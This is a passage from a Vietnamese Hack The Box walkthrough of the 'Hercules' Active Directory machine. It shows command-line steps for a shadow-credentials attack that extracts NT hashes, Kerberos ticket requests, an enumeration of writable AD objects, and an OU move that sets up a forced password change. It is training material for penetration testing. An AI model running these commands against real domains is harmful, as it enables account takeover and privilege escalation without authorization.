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
[*] Wrote credential cache to 'stdout'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f**
```

Sau đó mình đã hash của **`bob.w`** , giờ thì mình request cho TGT. 

```bash
**┌──(certipy-env)─(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 getTGT.py -dc-ip 10.10.11.91 -hashes :8a65c74e8f0073babbfac6725c66cc3f -k hercules.htb/bob.w
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bob.w.ccache**
```

Mình dùng tool bloodyAD để bắt đầu Active Directory Enum trong **`bob.w`** 

- https://github.com/CravateRouge/bloodyAD

> Xem [**wiki**](https://github.com/CravateRouge/bloodyAD/wiki) này để có thể biết thêm lệnh dùng để enum.
> 

Mình sẽ thử check **`writeable`** trên **`bob.w`** 

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop/bloodyAD/bloodyAD]
└─$ klist
Ticket cache: FILE:/home/kali/Desktop/bob.w.ccache
Default principal: bob.w@HERCULES.HTB

Valid starting       Expires              Service principal
11/30/2025 08:14:07  11/30/2025 18:14:07  krbtgt/HERCULES.HTB@HERCULES.HTB
        renew until 12/01/2025 08:14:02
                                                                                                               
┌──(env)─(kali㉿kali)-[~/Desktop/bloodyAD/bloodyAD]
└─$ python3 bloodyAD.py -d hercules.htb -u bob.w -k --host dc.hercules.htb --dc-ip 10.10.11.91 get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Vincent Gray,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Nate Hicks,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Mark Stone,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Elijah Morrison,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Angelo Onclarit,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
name: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
cn: WRITE

distinguishedName: CN=Ken Wiggins,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Johnathan Johnson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Harris Dunlop,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE**
```

Mình có **`CREATE_CHILD`** trên target **`OU`** 

```bash
**distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD
domainPolicy: CREATE_CHILD
msTAPI-RtPerson: CREATE_CHILD
msDS-App-Configuration: CREATE_CHILD
container: CREATE_CHILD
printQueue: CREATE_CHILD
indexServerCatalog: CREATE_CHILD
ipsecPolicy: CREATE_CHILD
volume: CREATE_CHILD
groupOfNames: CREATE_CHILD
msDS-ManagedServiceAccount: CREATE_CHILD
contact: CREATE_CHILD
msieee80211-Policy: CREATE_CHILD
document: CREATE_CHILD
person: CREATE_CHILD
mSMQMigratedUser: CREATE_CHILD
mS-SQL-OLAPServer: CREATE_CHILD
mS-SQL-SQLServer: CREATE_CHILD
organizationalPerson: CREATE_CHILD
msExchConfigurationContainer: CREATE_CHILD
msDS-GroupManagedServiceAccount: CREATE_CHILD
nisMap: CREATE_CHILD
nisObject: CREATE_CHILD
groupPolicyContainer: CREATE_CHILD
msDS-AzAdminManager: CREATE_CHILD
room: CREATE_CHILD
ipService: CREATE_CHILD
ipProtocol: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
applicationVersion: CREATE_CHILD
residentialPerson: CREATE_CHILD
msMQ-Group: CREATE_CHILD
group: CREATE_CHILD
oncRpc: CREATE_CHILD
serviceConnectionPoint: CREATE_CHILD
msDS-AppData: CREATE_CHILD
rRASAdministrationConnectionPoint: CREATE_CHILD
locality: CREATE_CHILD
msDS-ShadowPrincipalContainer: CREATE_CHILD
classStore: CREATE_CHILD
account: CREATE_CHILD
user: CREATE_CHILD
msMQ-Custom-Recipient: CREATE_CHILD
rFC822LocalPart: CREATE_CHILD
groupOfUniqueNames: CREATE_CHILD
ipsecNegotiationPolicy: CREATE_CHILD
ipsecNFA: CREATE_CHILD
documentSeries: CREATE_CHILD
rpcContainer: CREATE_CHILD
serviceAdministrationPoint: CREATE_CHILD
intellimirrorSCP: CREATE_CHILD
organizationalRole: CREATE_CHILD
msCOM-Partition: CREATE_CHILD
ipsecFilter: CREATE_CHILD
physicalLocation: CREATE_CHILD
computer: CREATE_CHILD
nisNetgroup: CREATE_CHILD
applicationEntity: CREATE_CHILD
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
name: WRITE
cn: WRITE**
```

Và mình cũng có quyền **`WRITE`** trên **`stephen.m`** , **`auditor`** và thậm chí trên chính user đó. 

```bash
**distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE

... 

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE**
```

```bash
**distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
name: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
cn: WRITE**
```

Giờ thì mình di chuyển tới **`stephen.m`** tới **`Web Department`** OU vì nó có nhiều ACLs dễ hơn.

→ Mình sẽ thực hiện nó với [**powerview.py**](https://github.com/aniqfakhrul/powerview.py) để có thể thực hiện enum giống như steroid version của **`PowerView.ps1`** 

- https://github.com/aniqfakhrul/powerview.py

![image](/assets/images/HTB/season9/Hercules/image%2067.png)

Mình sẽ dùng **`Set-DomainObjectDN`** để chỉnh sửa object của thuộc tính distinguishedName để thay đổi OU. 

```bash
**╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
PV > Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'      
[2025-11-30 11:05:50] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-11-30 11:05:50] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
[2025-11-30 11:05:51] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-11-30 11:05:51] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2025-11-30 11:05:51] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
[2025-11-30 11:05:51] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb**
```

Nhìn thấy nó báo **`Success`** → nghĩa là mình chuyển OU **`Orgnizational Unit`** của **`stephen.m`** từ OU **`Security Department`** sang OU **`Web Department`** giờ thì mình thử thực hiện lấy hash của **`stephen.m`** 

```bash
**┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
└─$ export KRB5CCNAME=~/Desktop/natalie.a.ccache                                                                      
                                                                                                                            
┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
└─$ klist
Ticket cache: FILE:/home/kali/Desktop/natalie.a.ccache
Default principal: natalie.a@HERCULES.HTB

Valid starting       Expires              Service principal
11/30/2025 08:03:20  11/30/2025 18:03:20  krbtgt/HERCULES.HTB@HERCULES.HTB
        renew until 12/01/2025 08:03:15
                                                                                                                            
┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
└─$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -dc-ip 10.10.11.91 -account stephen.m
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'stephen.m'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7ea499ad-ac99-94b8-c4e5-c78b37d09de7'
[*] Adding Key Credential with device ID '7ea499ad-ac99-94b8-c4e5-c78b37d09de7' to the Key Credentials for 'stephen.m'
[*] Successfully added Key Credential with device ID '7ea499ad-ac99-94b8-c4e5-c78b37d09de7' to the Key Credentials for 'stephen.m'
[*] Authenticating as 'stephen.m' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'stephen.m@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'stephen.m.ccache'
[*] Wrote credential cache to 'stephen.m.ccache'
[*] Trying to retrieve NT hash for 'stephen.m'
[*] Restoring the old Key Credentials for 'stephen.m'
[*] Successfully restored the old Key Credentials for 'stephen.m'
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210**
```

Giờ thì request cho TGT. 

```bash
**┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 getTGT.py -dc-ip 10.10.11.91 -hashes :9aaaedcb19e612216a2dac9badb3c210 -k hercules.htb/stephen.m
[sudo] password for kali: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in stephen.m.ccache**
```

Giờ mình quay lại bloodhound và nhìn thấy. 

![image](/assets/images/HTB/season9/Hercules/image%2068.png)

Mình có thể thấy **`stephen.m`** là thành viên của nhóm `S**ECURITY HELPDESK@HERCULES.HTB**` mà mình có thể **`ForceChangePassword`** tới **`Auditor`** 

Và nó cũng được show trong **`Shortest Path`** 

![image](/assets/images/HTB/season9/Hercules/image%2069.png)

Bây giờ mình sẽ thay đổi password cho **`Auditor`** thông qua **`bloodyAD`** 

![image](/assets/images/HTB/season9/Hercules/image%2070.png)

Tiếp tục request TGT cho **`Auditor`** 

![image](/assets/images/HTB/season9/Hercules/image%2071.png)

